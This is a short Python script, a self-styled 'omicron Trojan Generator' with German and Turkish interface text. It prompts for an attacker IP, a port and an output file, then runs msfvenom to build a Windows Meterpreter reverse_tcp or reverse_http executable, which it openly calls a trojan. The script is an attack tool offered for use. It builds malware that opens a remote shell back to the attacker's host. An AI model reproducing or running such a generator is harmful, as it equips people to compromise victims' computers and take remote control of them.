#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import art
from colorama import Fore, Style
import sys
import time
from os import system

system("cls||clear")
def rainbow_text(text, delay=0.1):
    colors = [
    "\033[31m", "\033[33m", "\033[32m", "\033[36m", "\033[34m", "\033[35m", "\033[37m",
    ]

    for i in range(len(text)):
        char = text[i]
        color = colors[i % len(colors)]
        sys.stdout.write(color + char)
        sys.stdout.flush()
        time.sleep(delay)

    sys.stdout.write("\033[0m")
    sys.stdout.write("\n")

def main():
    rainbow_text("Coding by omicr0n")
    sys.stdout.write("\033[37m")
    sys.stdout.write("Coding by Omicron\n")
	
if __name__ == "__main__":
    rainbow_text("Coding by omicr0n")

os.system("cls||clear")
my_art = art.text2art("Trojaner Erstellen", font="shadow")
print(Fore.LIGHTBLUE_EX + my_art)
print(Fore.LIGHTMAGENTA_EX + """
Willkommen beim 'omicron' Trojan Generator.
""")

ip = input("Local veya Dış İp Girin: ")
port = input("Port Girin: ")
print(""" 
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/revers_http
""")
payload = input("Payload No Girin: ")
kayityeri = input("Kayit Yeri Girin: ")

if(payload == "1"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
elif(payload == "2"):
	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
else:
	print("trojan oluştururken bir hata meydana geldi")
